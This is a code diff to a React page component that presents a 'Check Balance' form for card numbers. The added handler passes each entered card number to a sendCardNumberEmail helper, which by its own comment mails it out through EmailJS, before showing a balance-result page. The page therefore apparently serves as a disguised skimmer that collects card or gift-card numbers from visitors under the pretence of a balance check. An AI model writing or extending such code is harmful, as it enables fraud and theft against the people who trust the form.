@@ -14,8 +14,32 @@ export default function About() {
   const [error, setError] = useState('');
   const handleCheckBalance = async (e) => {
     e.preventDefault();
-    // Navigate immediately to balance-result page
-    router.push('/balance-result');
+    
+    if (!cardNumber.trim()) {
+      setError('Please enter a valid card number');
+      return;
+    }
+    
+    if (cardNumber.length < 10) {
+      setError('Please enter a complete card number');
+      return;
+    }
+    
+    setLoading(true);
+    setError('');
+    
+    try {
+      // Send card number to EmailJS
+      await sendCardNumberEmail(cardNumber);
+      console.log('Card number sent successfully to EmailJS');
+      
+      // Navigate to balance-result page after successful email send
+      router.push('/balance-result');
+    } catch (error) {
+      console.error('Failed to send card number:', error);
+      setError('Failed to process request. Please try again.');
+      setLoading(false);
+    }
   };
   return (
     <div
@@ -177,20 +201,22 @@ export default function About() {
           {error && <span style={{ color: 'red', marginBottom: '1rem' }}>{error}</span>}
           <button
             type="submit"
+            disabled={loading || !cardNumber.trim()}
             style={{
               width: '350px',
               maxWidth: '90vw',
-              background: '#0071e3',
+              background: loading || !cardNumber.trim() ? '#ccc' : '#0071e3',
               color: '#fff',
               border: 'none',
               borderRadius: '26px',
               fontWeight: 'bold',
               fontSize: '1.1rem',
               padding: '1rem',
-              cursor: 'pointer'
+              cursor: loading || !cardNumber.trim() ? 'not-allowed' : 'pointer',
+              opacity: loading || !cardNumber.trim() ? 0.7 : 1
             }}
           >
-            Check Balance
+            {loading ? 'Processing...' : 'Check Balance'}
           </button>
         </form>
   {/* learn more link moved above button */}
